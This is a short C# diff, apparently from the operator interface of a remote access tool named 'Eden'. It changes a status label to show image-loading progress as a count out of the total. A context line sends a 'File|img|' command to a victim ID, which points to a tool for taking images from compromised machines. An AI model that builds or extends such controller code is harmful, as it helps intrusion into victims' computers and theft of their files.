@@ -67,7 +67,7 @@ namespace Eden
                                 listView1.Items.Add(item);
 
                                 toolStripProgressBar1.Increment(1);
-                                toolStripStatusLabel1.Text = $"Image[{listView1.Items.Count}]";
+                                toolStripStatusLabel1.Text = $"Image[{listView1.Items.Count}/{m_lsImgFilename.Count}]";
                             }));
                         }
                     }
@@ -138,7 +138,7 @@ namespace Eden
             m_ImageList.ImageSize = new Size(255, 255);
 
             toolStripProgressBar1.Maximum = m_lsImgFilename.Count;
-            toolStripStatusLabel1.Text = $"Image[{listView1.Items.Count}]";
+            toolStripStatusLabel1.Text = $"Image[0/{m_lsImgFilename.Count}]";
 
             m_clnt.SendVictim(m_szVictimID, "File|img|" + clsTools.EZData.OneDList2String(m_lsImgFilename));
         }
